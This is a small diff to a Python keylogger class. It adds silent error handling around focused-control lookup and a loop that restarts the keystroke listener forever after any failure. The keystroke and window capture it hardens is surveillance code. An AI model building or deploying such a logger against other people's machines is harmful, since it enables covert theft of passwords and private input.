@@ -18,8 +18,11 @@ class KeyLogger:
         self.previous_win_info = get_active_window()
         
     def get_control(self):
-        control = auto.GetFocusedControl()
-        return control.Name if "Alt+" not in control.Name else None
+        try:
+            control = auto.GetFocusedControl()
+            return control.Name if "Alt+" not in control.Name else None
+        except:
+            return None
 
     # --- Keyboard functions ---
     def _on_press(self, key, injected = False):
@@ -138,7 +141,14 @@ class KeyLogger:
         self.keyboard_listener.start()
         self.keyboard_listener.join()
 
+    def run_forever(self):
+        while True:
+            try:
+                self.run()
+            except:
+                pass
+
 
 if __name__ == "__main__":
     keylogger = KeyLogger()
-    keylogger.run()
+    keylogger.run_forever()
